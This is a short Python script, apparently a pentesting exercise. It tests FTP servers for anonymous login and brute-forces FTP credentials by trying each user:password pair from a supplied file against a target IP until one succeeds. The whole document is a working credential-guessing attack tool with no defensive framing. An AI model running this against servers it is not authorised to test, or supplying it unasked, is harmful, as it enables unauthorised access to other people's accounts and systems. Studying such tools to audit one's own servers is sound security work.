#!/usr/bin/python3

import ftplib
from termcolor import colored

def anonLogin(hostname):
   try:
      ftp = ftplib.FTP(hostname)
      ftp.login('anonymous', 'anonymous')
      print(colored('[+] ' + hostname + " anonymous logon succeeded", 'green'))
      ftp.quit()
      return True
   except Exception as e:
      print(colored('[-] ' + hostname + ' FTP anonymous login failed', 'red'))
      return False

def bruteLogin(hostname, passwdFile):
   try:
      pF = open(passwdFile, 'r')
   except:
      print(colored('[-] File does not exists'))
      return
   for line in pF.readlines():
      userName = line.split(':')[0]
      passwd = line.split(':')[1].strip('\n')
      print(colored('[+] Trying: ' + userName + "/" + passwd, 'green'))
      try:
         ftp = ftplib.FTP(hostname)
         login = ftp.login(userName, passwd)
         print(colored('[+] Login succeeded with : ' + userName + ' / ' + passwd, 'green'))
         ftp.quit()
         return(userName, passwd)
      except:
         pass
   print(colored('[-] Password not in List', 'red'))

def main():
   host = input(colored('[+] Enter the ip address : ', 'green'))
   passwdFile = input(colored('[+] Enter the user/password file : '))
   bruteLogin(host, passwdFile)

if __name__ == '__main__':
   main()